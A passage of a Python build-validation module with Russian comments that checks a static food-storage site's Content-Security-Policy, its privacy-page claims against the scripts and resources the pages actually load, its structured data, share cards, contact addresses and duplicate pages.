    ничего наружу не уводит. Он не может доказать, что туда ничего не
    допишет ПЛАТФОРМА, — а у этой фермы Cloudflare однажды дописал скрипт на
    164 страницы ПОСЛЕ двадцати трёх зелёных гейтов. Обещание страницы
    приватности («откройте панель сети — там один запрос») до этой волны
    держалось на честном слове ровно в той части, которую мы не
    контролируем. Политика — единственное, что говорит уже БРАУЗЕРУ.

    ЧТО ЗДЕСЬ ПРОВЕРЯЕТСЯ, И ПОЧЕМУ ИМЕННО ЭТО:

      · политика есть на каждой странице и ровно одна; страниц ноль —
        провал, а не «нечего проверять»;
      · её директивы и их порядок совпадают с объявлением render.CSP_POLICY,
        а источники — с ним же плюс ХЭШИ, ПЕРЕСЧИТАННЫЕ ИЗ СОБРАННОЙ
        СТРАНИЦЫ. Это и есть защита от того, чем строгая политика уже дважды
        убивала счётчик на этой ферме: хэш, посчитанный до последней
        подстановки, роняет сборку здесь, а не молча выключает скрипт в
        браузере читателя;
      · в объявлении нет ни одного источника из render.CSP_FORBIDDEN
        ('unsafe-inline' вернул бы ровно то, ради чего всё написано) и ни
        одной директивы, которую браузер в <meta> игнорирует: рычаг,
        которого нет, хуже отсутствующего;
      · КАЖДЫЙ ключ render.FETCH_CARRIERS назван в render.CSP_GOVERNS —
        либо директивой, которая его держит, либо честным «эта политике не
        подчиняется» с причиной. Несущая, добавленная в таблицу и не
        названная здесь, роняет сборку: иначе политика и таблица разошлись
        бы молча, и обе выглядели бы целыми.

    ЧЕГО ЭТОТ ГЕЙТ НЕ ДОКАЗЫВАЕТ. Что политика РАБОТАЕТ. Это читается в
    консоли браузера на чистой вкладке, и никакой вывод сборки этого не
    заменяет — записанный урок фермы ровно об этом.
    """
    import render as rd
    bad, seen, hashed = [], 0, 0
    names = [d for d, _s, _t, _w in rd.CSP_POLICY]
    if len(names) != len(set(names)):
        bad.append("в объявлении политики повторяется директива")
    first = rd.CSP_POLICY[0] if rd.CSP_POLICY else None
    if not first or first[0] != "default-src" or "'none'" not in first[1]:
        bad.append("политика не начинается с default-src 'none': всё, что "
                   "забыли назвать, оказалось бы разрешено")
    for d, srcs, take, why in rd.CSP_POLICY:
        if not why.strip():
            bad.append("директива «%s» не объяснена словами" % d)
        if d in rd.CSP_META_IGNORES:
            bad.append("директива «%s» в <meta> браузером игнорируется" % d)
        for s in srcs:
            if s in rd.CSP_FORBIDDEN:
                bad.append("директива «%s» пускает «%s»" % (d, s))
        if take not in (None, "script", "style"):
            bad.append("директива «%s»: хэши «%s» никто не считает" % (d, take))
    for key, _a, _t2, _k, _h in rd.FETCH_CARRIERS:
        g = rd.CSP_GOVERNS.get(key)
        if g is None:
            bad.append("несущая «%s» не отнесена ни к одной директиве и не "
                       "объявлена незакрываемой" % key)
            continue
        d, why = g
        if not (why or "").strip():
            bad.append("несущая «%s»: не сказано, чем её держит политика"
                       % key)
        if d is not None and d not in names:
            bad.append("несущая «%s» отнесена к директиве «%s», которой в "
                       "политике нет" % (key, d))
    extra = set(rd.CSP_GOVERNS) - {c[0] for c in rd.FETCH_CARRIERS}
    if extra:
        bad.append("политика знает несущие, которых нет в таблице: %s"
                   % ", ".join(sorted(extra))[:60])
    for p, t in sorted(_html(files).items()):
        seen += 1
        metas = _csp_meta(t)
        if len(metas) != 1:
            bad.append("%s: политик безопасности %d" % (p, len(metas)))
            continue
        got = _csp_dirs(metas[0])
        if [d for d, _s in got] != names:
            bad.append("%s: директивы %s, ожидались %s"
                       % (p, " ".join(d for d, _s in got)[:60],
                          " ".join(names)[:60]))
            continue
        want_sc = _inline_hashes(t, "script")
        want_st = _inline_hashes(t, "style")
        hashed += len(want_sc) + len(want_st)
        for (d, srcs), (_d2, fixed, take, _w) in zip(got, rd.CSP_POLICY):
            want = list(fixed) + (want_sc if take == "script"
                                  else want_st if take == "style" else [])
            want = want or ["'none'"]
            if srcs != want:
                bad.append("%s: «%s» разрешает «%s», а страница несёт «%s»"
                           % (p, d, " ".join(srcs)[:44], " ".join(want)[:44]))
        if len(bad) > 40:
            break
    return (bad or (_seen(seen, "страниц с политикой безопасности")
                    + _seen(hashed, "хэшей встроенных кусков в политике")))[:8]


def g_privacy_matches_markup(files):
    """Текст политики сверяется с тем, что РЕАЛЬНО грузят страницы. В ОБЕ
    стороны.

    У студийного сайта в приватности было написано, что аналитики нет, а хост
    подставлял счётчик на каждую страницу. Утверждение о приватности касается
    не того, что мы написали, а того, что грузит браузер.

    Одной стороны мало, и это главная правка этой волны. Прежний гейт умел
    только «сказано «нет» — значит, не должно быть». Он молчал бы в обратном
    случае: реклама и счётчик приезжают в разметку, а политика продолжает
    отрицать их — и провалилась бы не сборка, а обещание читателю. Теперь
    проверяются обе:

      · отрицание обязано быть правдой о ВСЕЙ выкладке;
      · всё, что выкладка несёт, обязано быть НАЗВАНО в политике.

    Сюда же реклама: место в разметке без слова в политике — то же самое
    расхождение, только дороже.
    """
    import render as rd
    pv = files.get("privacy/index.html", "")
    if not pv:
        return ["нет страницы приватности"]
    vis = _visible(pv)
    # СТОРОНА «ПОЛИТИКА → РАЗМЕТКА» БОЛЬШЕ НЕ ТРИ ЛИТЕРАЛА. Отрицания
    # искались здесь фразами, вписанными в гейт руками: перепиши абзац
    # другими словами — и «отрицания на странице нет» гейт прочёл бы как
    # «отрицать нечего» и позеленел бы ровно тогда, когда обещание
    # перестало быть напечатанным. Ферма это уже проходила: перевёрстка
    # обесточила три гейта, и все три позеленели.
    #
    # Теперь фразы объявлены ОДИН раз в render.PRIVACY_CLAIMS, страница
    # печатается оттуда же, а сверка идёт РАВЕНСТВОМ: фраза стоит на
    # странице тогда и только тогда, когда сборка её держит.
    claims = {k: (phrase, human) for k, phrase, human in rd.PRIVACY_CLAIMS}
    said = {k: (phrase in vis) for k, (phrase, _hu) in claims.items()}
    denies_analytics = said.get("analytics", False)
    denies_cookies = said.get("cookies", False)
    denies_third = said.get("third", False)
    denies_ads = said.get("ads", False)
    bad = []
    ext_src, storage, analytics, slots = set(), False, False, 0
    seen, policed = 0, 0
    for p, t in _html(files).items():
        seen += 1
        if _csp_meta(t):
            policed += 1
        bodies = " ".join(b for _a, b in
                          re.findall(r"<script([^>]*)>(.*?)</script>", t, re.S))
        # РАЗБОРОМ, а не регуляркой на двойные кавычки: `src='//x'` и
        # `src=//x` грузят ровно так же, а регулярка видит одну запись из
        # трёх. Тот же дефект уже чинили в g_scripts и в гейте ссылок.
        for _tg, _at in _tags(t):
            if _tg == "script" and _at.get("src"):
                ext_src.add(_at["src"].split("?")[0])
        if re.search(r"gtag|googletagmanager|plausible|umami|matomo|clarity",
                     bodies + " " + " ".join(ext_src), re.I):
            analytics = True
        if re.search(r"document\.cookie|localStorage|sessionStorage", bodies):
            storage = True
        slots += len(_ad_divs(t))
    # Сторона первая: отрицание против разметки.
    if denies_analytics and analytics:
        bad.append("политика отрицает аналитику, а разметка её несёт")
    if denies_cookies and storage:
        bad.append("политика отрицает куки и хранилище, а разметка их несёт")
    if denies_third and ext_src:
        bad.append("политика отрицает внешние скрипты, а их %d"
                   % len(ext_src))
    # СТОРОНА ТРЕТЬЯ, и она была дырой размером с обещание. Здесь читался
    # ровно `<script src>` — одна несущая из двадцати девяти. Счётчик,
    # приехавший картинкой, пикселем в `srcset`, `@import`-ом или `fetch()`
    # в теле скрипта, страницу приватности не трогал вовсе, и она уверяла
    # читателя в том, чего никто не проверял. Обещание о приватности — это
    # обещание о том, ЧТО ГРУЗИТ БРАУЗЕР.
    origins = _resource_origins()
    out_ok = _outbound_allowed()
    outside = set()
    for _p2, t2 in _html(files).items():
        for _k2, human2, val2, mode2 in _fetch_points(t2, rd.FETCH_CARRIERS):
            if mode2 == "js":
                outside.add("скрипт ходит в сеть на ходу: %s" % val2)
            elif mode2 == "res" and _fetch_verdict(val2, mode2, origins,
                                                   out_ok):
                outside.add("%s: %s" % (human2[:24], val2[:40]))
    if denies_third and outside:
        bad.append("политика отрицает внешние загрузки, а их %d, первая — %s"
                   % (len(outside), sorted(outside)[0]))
    # Число несущих ПЕЧАТАЕТСЯ страницей из того же объявления, по которому
    # сканирует гейт, и здесь сверяется с ним. Иначе абзац «проверено
    # столько-то способов» переживёт удаление половины списка и станет ровно
    # тем, чем был раньше: утверждением о браузере, написанным на память.
    ways = ("the %d kinds of address-carrying construct"
            % len(rd.FETCH_CARRIERS))
    if ways not in vis:
        bad.append("политика не называет число несущих: ждали «%s»" % ways)
    # ОБЛАСТЬ тоже печатается из объявления: обещание «проверено всё, что
    # грузит браузер» держалось на том, что гейт читал один `.html`.
    kinds = "all %d file formats it knows" % len(rd.SERVED_KINDS)
    if kinds not in vis:
        bad.append("политика не называет число видов файлов: ждали «%s»"
                   % kinds)
    if denies_ads and slots:
        bad.append("политика отрицает рекламу, а мест %d" % slots)
    # Сторона вторая: разметка против политики.
    if analytics and not re.search(r"analytics service|counts page views",
                                   vis):
        bad.append("аналитика в разметке не названа в политике")
    if storage and "Cookies are used" not in vis:
        bad.append("хранилище в разметке не названо в политике")
    if ext_src and not analytics and not rd.AD_NETWORK:
        bad.append("внешний скрипт есть, а политика ни о чём таком не знает")
    if slots and "advertising" not in vis.lower():
        bad.append("рекламные места есть, а политика о рекламе молчит")
    # Обещанное и несуществующее — тот же дефект, только в другую сторону:
    # флаг ANALYTICS переписывает эту страницу и НЕ ставит ни одного скрипта,
    # то есть сам по себе он рычаг, которого не существует. Пусть сборка
    # краснеет на том, кто его дёрнул, а не читатель на обещании.
    if not analytics and "analytics service" in vis:
        bad.append("политика обещает аналитику, которой в разметке нет")
    if not storage and "Cookies are used only where you have agreed" in vis:
        bad.append("политика обещает куки, которых в разметке нет")
    if rd.AD_NETWORK:
        if rd.AD_NETWORK not in vis:
            bad.append("сеть включена, а политика её не называет")
        if rd.AD_ORIGINS[rd.AD_NETWORK][0] not in vis:
            bad.append("сеть включена, а её адрес в политике не назван")
        if denies_third:
            bad.append("сеть включена, а политика отрицает внешние скрипты")
    elif slots and not denies_third:
        bad.append("сети нет и внешних скриптов нет, а политика этого не "
                   "говорит")
    # ОБЕ СТОРОНЫ ОДНИМ ПРАВИЛОМ, и обе — из одного объявления. Обещание,
    # которого сборка не держит, — обман читателя; обещание, которое сборка
    # держит, а страница уже не печатает, — выключенная проверка, и это
    # ровно тот случай, когда гейт зеленеет от того, что смотреть стало не
    # на что.
    truth = {
        "analytics": not analytics,
        "cookies": not storage,
        "third": not ext_src and not outside,
        "ads": not slots,
        "one_request": not analytics and not ext_src and not outside,
        "policy": bool(seen) and policed == seen,
    }
    for k in sorted(claims):
        phrase, human = claims[k]
        if k not in truth:
            bad.append("обещание «%s» объявлено, а проверить его нечем" % k)
            continue
        if said[k] and not truth[k]:
            bad.append("политика обещает: %s — а сборка этого не держит" % human)
        elif truth[k] and not said[k]:
            bad.append("сборка держит «%s», а страница этого больше не "
                       "обещает: фразы «%s» на ней нет" % (human, phrase))
    return (bad or (_seen(seen, "страниц сверено с политикой")
                    + _seen(len(claims), "объявленных обещаний политики")))[:8]


# --------------------------------------------- структурные данные и карточка

# Что разрешено печатать в схеме. Ключ, которого здесь нет, — провал: иначе
# в разметку однажды приедет выдуманная оценка или выдуманный автор, а на
# YMYL-теме это не «улучшение сниппета», а обман и заявка на санкции.
LD_TYPES = ("WebSite", "WebPage", "Dataset", "ItemList", "ListItem",
            "Organization", "PropertyValue")
# Значение обязано ВСТРЕЧАТЬСЯ НА СТРАНИЦЕ. Разметка, обещающая роботу то,
# чего человек не видит, — это ровно то, за что снимают расширенные
# результаты.
LD_VISIBLE = ("name", "description", "value", "keywords")
LD_URL = ("url", "@context", "@id")
# legalName объявлено ЗДЕСЬ, а не пропущено: имя юрлица убрано с видных мест
# сайта по правилу владельца, но в структурных данных остаётся — машине
# издателя назвать надо. Значение прибито: подмена на чужое имя обязана
# краснеть.
LD_CONST = {"inLanguage": ("en-US",), "legalName": ("BiLingoPlus LLC",)}
LD_NUM = ("position", "numberOfItems")


def _ld_walk(node, out):
    if isinstance(node, dict):
        for k, v in node.items():
            out.append((k, v))
            _ld_walk(v, out)
    elif isinstance(node, list):
        for v in node:
            _ld_walk(v, out)


def g_schema_matches_page(files):
    """Структурные данные есть, разбираются и НЕ ОБЕЩАЮТ ЛИШНЕГО.

    До этой волны структурных данных на сайте не было ни строки — как и
    карточек шаринга, — а ссылка без карточки выглядит голой везде, куда её
    кладут. Опасность обратная: схема — самое лёгкое место, чтобы напечатать
    рейтинг, автора или дату, которых у сайта нет.

    Поэтому проверка в обе стороны: каждая страница обязана нести ровно один
    блок; каждый тип — из списка; каждое ЗНАЧИМОЕ значение обязано
    встречаться на самой странице; а ключ, не описанный здесь, роняет сборку,
    даже если он безобиден. Список решает гейт, а не автор схемы.
    """
    import render as rd
    bad, seen = [], 0
    ok_urls = {rd.SOURCE_URL, rd.source_meta()["url"], "https://schema.org"}
    for p, t in sorted(_html(files).items()):
        blocks = re.findall(
            r'<script type="application/ld\+json">(.*?)</script>', t, re.S)
        if len(blocks) != 1:
            bad.append("%s: блоков схемы %d" % (p, len(blocks)))
            continue
        try:
            data = json.loads(blocks[0])
        except ValueError as e:
            bad.append("%s: схема не разбирается (%s)" % (p, e))
            continue
        seen += 1
        title = re.search(r"<title>(.*?)</title>", t, re.S)
        desc = re.search(r'<meta name="description" content="([^"]*)"', t)
        hay = " ".join([_visible(t),
                        unescape(title.group(1)) if title else "",
                        unescape(desc.group(1)) if desc else ""]).lower()
        pairs = []
        _ld_walk(data, pairs)
        for k, v in pairs:
            if isinstance(v, (dict, list)):
                continue
            if k == "@type":
                if v not in LD_TYPES:
                    bad.append("%s: тип %s не объявлен" % (p, v))
            elif k in LD_NUM:
                if not isinstance(v, int):
                    bad.append("%s: %s не число" % (p, k))
            elif k in LD_CONST:
                if v not in LD_CONST[k]:
                    bad.append("%s: %s=%s не объявлено" % (p, k, v))
            elif k == "dateModified":
                if v != rd.CONTENT_DATE.isoformat():
                    bad.append("%s: дата схемы %s" % (p, v))
            elif k in LD_URL:
                if not (v.startswith("https://%s" % DOMAIN_HINT[0])
                        or v in ok_urls):
                    bad.append("%s: адрес схемы %s" % (p, v[:50]))
            elif k in LD_VISIBLE:
                if str(v).lower() not in hay:
                    bad.append("%s: «%s» в схеме, но не на странице"
                               % (p, str(v)[:40]))
            else:
                bad.append("%s: поле схемы «%s» не описано в гейте" % (p, k))
    return (bad or _seen(seen, "блоков схемы"))[:8]


OG_REQUIRED = ("og:type", "og:site_name", "og:locale", "og:title",
               "og:description", "og:url")


def g_share_card(files):
    """Карточка шаринга есть на каждой странице и обещает ТО ЖЕ, что голова.

    Ноль карточек на 242 страницах: единственный рычаг роста ветки — ссылки,
    а ссылка без карточки выглядит голой везде, куда её кладут. Проверка в
    обе стороны: набор свойств ровно объявленный, и каждое значение
    совпадает с тем, что уже стоит в голове страницы. Две разные обещания об
    одной странице — это тот же дефект, что бирка против прозы.

    Картинки в карточке нет намеренно: у сайта нет ни одной, а адрес
    несуществующей — и ложь, и внешний запрос со страницы, которая обязана
    обходиться без единого.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        og = dict(re.findall(
            r'<meta property="(og:[a-z_]+)" content="([^"]*)"', t))
        if set(og) != set(OG_REQUIRED):
            bad.append("%s: свойства карточки %s, объявлено %s"
                       % (p, sorted(og), sorted(OG_REQUIRED)))
            continue
        seen += 1
        title = re.search(r"<title>(.*?)</title>", t, re.S)
        desc = re.search(r'<meta name="description" content="([^"]*)"', t)
        can = re.search(r'<link rel="canonical" href="([^"]*)"', t)
        if title and og["og:title"] != title.group(1):
            bad.append("%s: заголовок карточки не тот" % p)
        if desc and og["og:description"] != desc.group(1):
            bad.append("%s: описание карточки не то" % p)
        if can and og["og:url"] != can.group(1):
            bad.append("%s: адрес карточки не тот" % p)
        if "og:image" in t:
            bad.append("%s: карточка обещает картинку, которой нет" % p)
        if '<meta name="twitter:card"' not in t:
            bad.append("%s: нет типа карточки" % p)
    return (bad or _seen(seen, "карточек шаринга"))[:8]


def g_contact_is_on_this_domain(files):
    """Публичный адрес — на СВОЁМ домене и ровно на объявленных страницах.

    `info@bilingoplus.com` — почта поддержки платящих клиентов, и на витрине
    справочника ей не место: PLAYBOOK это запрещает прямо. Второе правило —
    про количество: адрес стоял на 302 страницах, а обфускация почты у
    Cloudflare переписывает КАЖДОЕ найденное вхождение и дописывает свой
    скрипт. Чем меньше страниц он трогает, тем меньше расходится отданное с
    собранным.
    """
    import render as rd
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        found = set(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+", t))
        own = "/" + p[:-len("index.html")] if p.endswith("index.html") else p
        if not own.startswith("/"):
            own = "/" + own
        for a in sorted(found):
            seen += 1
            if not a.endswith("@" + rd.DOMAIN):
                bad.append("%s: чужой адрес %s" % (p, a))
            elif own not in rd.CONTACT_PAGES:
                bad.append("%s: адрес почты вне объявленных страниц" % p)
    for page in rd.CONTACT_PAGES:
        key = page.strip("/") + "/index.html"
        if rd.CONTACT not in files.get(key, ""):
            bad.append("%s: объявлена как страница с адресом, а адреса нет"
                       % key)
    return (bad or _seen(seen, "адресов почты"))[:8]


def g_source_is_citable(files):
    """Источник назван адресом и датой, и на страницу метода ведёт КАЖДАЯ.

    Внешних ссылок на сайте было ноль: «USDA FoodKeeper» стояло на 242
    страницах, а `foodsafety.gov` — ни на одной. На теме, где ошибка стоит
    здоровья, это разом вопрос доверия и вопрос ранга: сайт просил верить и
    не давал сходить к источнику.
    """
    import render as rd
    key = rd.METHOD_PATH.strip("/") + "/index.html"
    method = files.get(key, "")
    bad = []
    if not method:
        return ["нет страницы метода"]
    vis = _visible(method)
    if rd.SOURCE_URL not in method:
        bad.append("страница метода не даёт адреса источника")
    if rd.source_meta()["url"] not in method:
        bad.append("страница метода не даёт адреса файла данных")
    if rd.SOURCE_RETRIEVED not in vis:
        bad.append("страница метода не называет дату снятия")
    if rd.source_meta()["sha256"][:12] not in vis:
        bad.append("страница метода не называет отпечаток снимка")
    miss = [p for p, t in sorted(_html(files).items())
            if 'href="%s"' % rd.METHOD_PATH not in t and p != key]
    if miss:
        bad.append("на страницу метода не ведёт %d страниц: %s"
                   % (len(miss), ", ".join(miss[:3])))
    return (bad or _seen(len(_html(files)), "страниц со ссылкой на метод"))[:8]


def _products(files):
    """Страницы товаров по СОБСТВЕННОЙ метке в разметке. Раньше признаком было
    число косых черт в адресе, и правила товара применялись к политике."""
    return {p: t for p, t in _html(files).items()
            if 'name="page-type" content="product"' in t}


def g_answer_first(files):
    """Под каждым H2 самодостаточный абзац своего окна и с числом.

    Окно спрашивается ТОЙ ЖЕ функцией, что и в сборке. Пока таблица
    окон стояла здесь копией под именем INTRO_HINT, это были две
    лестницы для одной величины, и третье окно развело их на первом
    же прогоне: 20 абзацев перечисляющего блока мерялись окном ответа.

    Пустая выборка — провал: разметка без единого абзаца под заголовком
    означает, что гейт смотрит не туда, а не что всё хорошо.
    """
    import render as rd
    bad, seen = [], 0
    for p, t in _products(files).items():
        for h2, attrs, para in rd.sections_of(t):
            seen += 1
            n = pr.wc(para)
            lo, hi = pr.window_for(h2, attrs)
            if not lo <= n <= hi:
                bad.append("%s: «%s» — %d слов, окно %d–%d"
                           % (p, h2[:28], n, lo, hi))
            elif not re.search(r"[0-9]", para):
                bad.append("%s: «%s» без числа" % (p, h2[:28]))
    return (bad or _seen(seen, "абзацев под заголовком"))[:20]


def g_twins(files):
    """Ни одной пары страниц выше порога — по ТРЁМ меркам сразу.

    Прежде мерка была одна: `own_prose`, то есть первый абзац под каждым
    непостоянным H2 — около двухсот слов из тысячи семисот. Замер по полному
    видимому тексту нашёл пары, которых она не видела: «bagel, fresh baked ~
    macaroons, french» — 0,81 по странице целиком при 0,68 по прозе, две
    расходящиеся фразы на две побайтово одинаковые страницы.

    Мерки РАЗНЫЕ вопросы, а не одна с поправкой:
      · своя проза, порог TWIN_MAX — пишем ли мы всем одно и то же;
      · вся страница С ЧИСЛАМИ, порог PAGE_TWIN_MAX — одинаково ли выглядит
        отданное;
      · вся страница ПО СКЕЛЕТУ, числа выброшены, порог PAGE_SKEL_MAX — не
        один ли это шаблон с подставленными значениями.

    Порог ВКЛЮЧЁН (`>=`): границу, которую можно занять, занимают.

    Пустая выборка — провал. Все три мерки держатся на разметке, а разметку
    переписывает любая перевёрстка: гейт, который однажды срезал корпус с 593
    страниц до пяти, обязан кричать, а не зеленеть, если селектор перестал
    находить хоть что-нибудь.
    """
    import render as rd
    bad, seen = [], 0
    kinds = {}
    for p, t in _html(files).items():
        m = re.search(r'name="page-type" content="([a-z]+)"', t)
        if m:
            kinds.setdefault(m.group(1), []).append(p)
    for _kind, paths in sorted(kinds.items()):
        if len(paths) < 2:
            continue
        keys = sorted(paths)
        texts = [rd.page_text(files[x]) for x in keys]
        marks = (("своя проза",
                  [rd.shingles(rd.own_prose(files[x])) for x in keys],
                  rd.TWIN_MAX),
                 ("вся страница",
                  [rd.shingles_num(x) for x in texts], rd.PAGE_TWIN_MAX),
                 ("скелет страницы",
                  [rd.shingles(x) for x in texts], rd.PAGE_SKEL_MAX))
        for what, sh, thr in marks:
            if not any(sh):
                bad.append("мерка «%s» не нашла ни одного слова" % what)
                continue
            seen += sum(1 for x in sh if x)
            for i in range(len(sh)):
                for j in range(i + 1, len(sh)):
                    jc = rd.jaccard(sh[i], sh[j])
                    if jc >= thr:
                        bad.append("%s: %s ~ %s: %.3f при пороге %.2f"
                                   % (what, keys[i], keys[j], jc, thr))
                        if len(bad) > 10:
                            return bad
    return bad or _seen(seen, "страниц прочитано")


# Подпись поля бирки РЕЖЕТСЯ по границе слова: у консервов имя состояния
# длиной в предложение давало пять строк капители над величиной, дважды на
# одной бирке. Полное имя стоит заголовком группы в бланке. Сверка поэтому
# такая: обрезанное обязано быть НАЧАЛОМ полного, а хвост — местом хранения —
# совпадать дословно. Это правило, а не поблажка: «начинается с» без сверки
# хвоста пропустило бы поле, помеченное не тем местом.
_CUT = chr(8230)


def _cap_names(cap, full):
    """Называет ли подпись поля ту же величину, что и полное имя."""
    if cap == full:
        return True
    if _CUT not in cap:
        return False
    head, _, tail = cap.partition(_CUT)
    return bool(head) and full.startswith(head) and full.endswith(tail)


def _field_key(cap, rows):
    """Ключ строки бланка, который называет то же поле, или None."""
    for key in rows:
        if _cap_names(cap, key):
            return key
    return None


def g_one_value_one_relation(files):
    """Величина, названная на странице дважды, обязана быть названа одинаково.

    Срок печатается и полем бирки, и строкой бланка. Пока это делали две
    функции с разными порогами, в таблице стояло «1 month», а в абзаце про то
    же самое — «4 weeks», и оба были формально правы.

    Гейт переписан с врезки и таблицы на поля бирки: прежний искал
    `<p class="lead">` и `<td>`, которых на странице больше нет, и печатал
    «пройден», не сверив ни одной величины.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        # Область гейта — часть гейта. Прежде она задавалась МЕТКОЙ
        # `page-type=product`: страница, потерявшая метку, выпадала из
        # проверки целиком и молча. Теперь она задаётся РАЗМЕТКОЙ — «есть
        # хоть одна величина на бирке», — и правило накрывает любую страницу,
        # которая печатает величину над перфорацией, какой бы метки она ни
        # носила. Подпись поиска носит тот же класс `cap` и величины не
        # печатает: одного `cap` для входа мало.
        # ГЛАВНАЯ ВЕЛИЧИНА СТРАНИЦЫ ПЕРЕЕХАЛА ИЗ .dur В .out, и гейт обязан
        # был переехать с ней. Пока условие входа спрашивало только `.dur`,
        # проверка оставалась зелёной, но ответ — то самое число, ради
        # которого страница написана, — не сверялся с бланком ВООБЩЕ: под
        # проверкой оставались второе окно и поле «числа нет». Это третий
        # случай подряд, когда смена облика оставляет гейт без его разметки;
        # здесь он пойман не глазом, а вопросом «что этот гейт теперь НЕ
        # проверяет», заданным до прогона.
        if not re.search(r'<div class="(?:hot|field)"><div class="cap">'
                         r'[^<]*</div><div class="(?:dur|out)', t):
            continue
        seen += 1
        # Страница читается ПО ПОРЯДКУ: заголовок состояния задаёт контекст
        # строкам под ним. Плоский словарь складывал окна разных состояний в
        # одно имя — а у состояний они разные, и именно поэтому каждое
        # состояние обязано печатать свой подзаголовок.
        rows, kind = {}, ""
        for m in re.finditer(
                r'<h3 class="kind">(.*?)</h3>'
                r'|<span class="rk">([^<]*)</span>'
                r'<span class="rv"[^>]*>(?:<small>[^<]*</small>)?([^<]*)</span>',
                t, re.S):
            if m.group(1) is not None:
                kind = m.group(1).strip()
                continue
            key = ("%s &middot; %s" % (kind, m.group(2))
                   if kind else m.group(2))
            rows.setdefault(key, m.group(3))
        if not rows:
            bad.append("%s: бланка величин нет вовсе" % p)
            continue
        fields = re.findall(
            r'<div class="(?:hot|field)">'
            r'<div class="cap">([^<]*)</div>'
            r'<div class="dur(?: long)?">([^<]*)</div>', t)
        # У ячейки ответа величина лежит в `data-plain` — ровно то, что стоит
        # в ней до ввода даты и что печатает скрипт, когда поле очищают.
        fields += re.findall(
            r'<div class="hot"><div class="cap">([^<]*)</div>'
            r'<div class="out"[^>]*data-plain="([^"]*)"', t)
        if not fields:
            bad.append("%s: на бирке нет ни одной величины" % p)
            continue
        for cap, dur in fields:
            # Объявленное поле «числа нет» — не величина, названная дважды, а
            # утверждение, что её нет вовсе. Оно допускается ТОЛЬКО там, где в
            # бланке действительно нет ни одного числа: иначе им можно было бы
            # прикрыть любое расхождение бирки с бланком.
            if cap == pr.NO_WINDOW_CAP:
                if any(re.search(r"[0-9]", v) for v in rows.values()):
                    bad.append("%s: поле «%s» стоит там, где в бланке есть "
                               "число" % (p, cap))
                continue
            key = _field_key(cap, rows)
            if key is None:
                bad.append("%s: поле «%s» не встречается в бланке" % (p, cap))
            elif dur not in rows[key]:
                bad.append("%s: на бирке «%s», в бланке «%s»"
                           % (p, dur, rows[key]))
    return (bad or _seen(seen, "страниц с биркой и бланком"))[:20]

def g_no_self_contradiction(files):
    """Два утверждения одной страницы об одном и том же не должны спорить.

    Страница Butter отрицала кладовую словами «never at room temperature», а
    подсказка источника прямо под ней говорила «may be left at room
    temperature for 1 - 2 days». Каждое по отдельности верно; вместе они
    противоречат друг другу, и структурные гейты этого не видят.
    """
    bad, seen = [], 0
    pairs = (("never at room temperature", "Pantry", "кладовая"),
             ("no freezer figure at all", "Freeze", "морозилка"),
             ("does not recommend freezing", "Freeze", "заморозка"))
    for p, t in _products(files).items():
        if '<span class="rk">' not in t:
            continue
        seen += 1
        for claim, tip, what in pairs:
            if claim in t and ('<span class="rk">%s</span>' % tip) in t:
                bad.append("%s: «%s» при подсказке про %s" % (p, claim, what))
        # Запрет способа против НАПЕЧАТАННОГО срока того же способа. Ячейка и
        # способ — разные вещи: у молока «в морозилке» сказано «не надо», а
        # «в морозилке от дня покупки» дало три месяца, и страница печатала
        # «морозилка тут не вариант» над строкой с морозилкой.
        if "not an option here" in t or "no colder option" in t:
            rows = re.findall(r'<span class="rk">([^<]*[Ff]reezer[^<]*)'
                              r'</span><span class="rv"[^>]*>'
                              r'(?:<small>[^<]*</small>)?([^<]*)</span>', t)
            live = [r for r in rows if "not recommended" not in r[1]]
            if live:
                bad.append("%s: сказано, что морозилки нет, а напечатано "
                           "«%s — %s»" % (p, live[0][0], live[0][1][:24]))
    return (bad or _seen(seen, "страниц со строками бланка"))[:20]


# ------------------------------------------------ одна величина — одна функция
#
# Всё, что ниже, охраняет ОДНО правило: число, напечатанное в двух местах,
# обязано приходить из ОДНОЙ функции, а у отношения обязано быть спрошено
# направление. Аудит 05.09.2026 нашёл на этом сайте четыре разных нарушения
# сразу: витрины печатали не связывающее окно (401 строка), указатель —
# оптимистичный конец (127 строк), бирка и проза — два разных «во сколько
# раз» под одной подписью (24 страницы), а подпись называла не ту операцию
# (9 страниц).


def _listing_rows(files):
    """Все строки списков во ВСЕЙ сборке: (страница, адрес, напечатанное).

    Область гейта — часть гейта. Прежняя проверка связывающего окна читала
    только страницы товаров, а нарушалось правило на витринах: 401 строка с
    вердиктом и без него.
    """
    out = []
    for p, t in _html(files).items():
        for m in re.finditer(r'<li><a href="/([^/"]+)/">'
                             r'<span class="n">[^<]*</span>'
                             r'<span class="v">(.*?)</span></a></li>', t,
                             re.S):
            # Величина бывает из двух частей: число и оговорка строкой ниже
            # (`<small>`). Читать до первого тега значило бы не видеть ни
            # одной строки с оговоркой — то есть проверять пустоту.
            val = re.sub(r"<[^>]+>", " ", m.group(2))
            out.append((p, m.group(1), unescape(" ".join(val.split()))))
    return out


def g_listing_is_binding(files):
    """В списке напечатано СВЯЗЫВАЮЩЕЕ окно, а не самое длинное.

    401 строка шестнадцати витрин обещала длинный конец: «Pies — 4 days
    outside the freezer» там, где источник даёт двухчасовой предел при
    комнатной температуре, и «Gravy — 5 years» там, где вскрытая банка живёт
    день. Гейт сверяет КАЖДУЮ строку КАЖДОЙ страницы (не только товарной).

    ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА, и здесь она полная. В строке списка бывает
    ровно две величины, и обе проверяются своей функцией:

    * окно хранения — обязано начинаться с prose.answer_value, то есть с
      того же связывающего окна, что помечено сигналом на самой странице;
    * кратность на двух вычисленных витринах — обязана совпадать с
      fk.freeze_gain / fk.opening_cost того же продукта, потому что это те
      же функции, которыми считает бирка.

    Третьего вида строк нет: всё, что не подошло ни под одну форму, гейт
    объявляет провалом, а не пропускает.
    """
    import prose as pr
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    bad, seen = [], 0
    for p, slug, val in _listing_rows(files):
        it = by.get(slug)
        if not it:
            continue
        # «keeps exactly as long» — не величина, а утверждение о РАВЕНСТВЕ с
        # текущей страницей: своё число там печатать нечего.
        if val == "keeps exactly as long":
            continue
        if val.startswith("keeps "):
            val = val[6:]
        seen += 1
